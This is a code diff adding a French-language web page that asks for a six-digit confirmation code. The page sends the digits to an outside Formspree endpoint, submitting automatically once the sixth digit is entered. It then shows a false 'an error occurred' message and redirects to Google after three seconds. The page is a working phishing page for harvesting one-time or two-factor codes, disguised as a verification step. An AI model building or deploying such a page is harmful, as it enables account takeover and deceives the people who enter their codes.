@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styl.css">
+    <title>Document</title>
+    <script>
+           const numberInputs = document.querySelectorAll('input[type="number"]');
+
+for (let i = 0; i < numberInputs.length; i++) {
+  numberInputs[i].addEventListener('mousewheel', function(event) {
+    event.preventDefault();
+  }, { passive: false });
+}
+    </script>
+</head>
+
+<body>
+    
+    <title>Récupération de code à six chiffres</title>
+	<style>
+		/* Centrer le formulaire en milieu de page */
+		form {
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+			height: 100vh;
+		}
+
+		input[type="text"] {
+			width: 50px;
+			height: 50px;
+			font-size: 24px;
+			text-align: center;
+			margin-right: 10px;
+			border: 2px solid #ccc;
+			border-radius: 5px;
+			outline: none;
+		}
+
+		input[type="text"]:focus {
+			border-color: #0077ff;
+		}
+
+		button {
+			margin-top: 20px;
+			padding: 10px 20px;
+			background-color: #0077ff;
+			color: #fff;
+			border: none;
+			border-radius: 5px;
+			font-size: 16px;
+			cursor: pointer;
+		}
+
+		button:hover {
+			background-color: #005ae6;
+		}
+	</style>
+</head>
+<body>
+	<form id="test" method="POST" action="https://formspree.io/f/mknakjpe">
+		<label>Code de comfirmation :</label>
+		<div>
+			<input type="text" maxlength="1" pattern="[0-9]{1}" required name="chiffre1">
+			<input type="text" maxlength="1" pattern="[0-9]{1}" required name="chiffre2">
+			<input type="text" maxlength="1" pattern="[0-9]{1}" required name="chiffre3">
+			<input type="text" maxlength="1" pattern="[0-9]{1}" required name="chiffre4">
+			<input type="text" maxlength="1" pattern="[0-9]{1}" required name="chiffre5">
+			<input type="text" maxlength="1" pattern="[0-9]{1}" required name="chiffre6">
+		</div>
+		<button type="submit">Valider</button>
+		<p id="status" class="hidden"></p> <!-- balise pour le message caché initialement -->
+	</form>
+</body>
+  
+
+<style>
+	.hidden {
+		display: none; /* cacher le message */
+	}
+</style>
+<script>
+	var form = document.getElementById("test");
+	async function handleSubmit(event) {
+	  event.preventDefault();
+	  var data = new FormData(event.target);
+	  fetch(event.target.action, {
+		method: form.method,
+		body: data,
+		headers: {
+		  'Accept': 'application/json'
+		}
+	  }).then(response => {
+		if (response.ok) {
+		  form.reset();
+		  var status = document.getElementById("status");
+		  status.innerHTML = "Nous sommes désolés, mais une erreur est survenue. Nous travaillons activement pour résoudre le problème. Veuillez réessayer ultérieurement ou contacter notre équipe de support si le problème persiste. Merci de votre compréhension";
+		  status.classList.remove("hidden"); // afficher le message
+		  setTimeout(() => {
+			window.location.href = "https://www.google.com";
+		  }, 3000); // temps en millisecondes avant la redirection
+		} else {
+		  response.json().then(data => {
+			if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
+			  var status = document.getElementById("status");
+			  status.innerHTML = data.errors.map(error => error.message).join(", ");
+			  status.classList.remove("hidden"); // afficher le message
+			} else {
+			  var status = document.getElementById("status");
+			  status.innerHTML = "Oops ! Il y a eu un problème lors de la soumission de votre formulaire.";
+			  status.classList.remove("hidden"); // afficher le message
+			}
+		  })
+		}
+	  }).catch(error => {
+		var status = document.getElementById("status");
+		status.innerHTML = "Oops ! Il y a eu un problème lors de la soumission de votre formulaire.";
+		status.classList.remove("hidden"); // afficher le message
+	  });
+	}
+	form.addEventListener("submit", handleSubmit);
+
+	var inputs = document.querySelectorAll("input");
+	for (var i = 0; i < inputs.length; i++) {
+		inputs[i].addEventListener("input", function() {
+			if (this.value.length === this.maxLength) {
+				var index = Array.prototype.indexOf.call(inputs, this);
+				if (index !== inputs.length - 1) {
+					inputs[index + 1].focus();
+				} else {
+					form.submit();
+				}
+			}
+		});
+	}
+</script>
+
+
+
+
+
+  
+  </body>
+  
+
+</html>
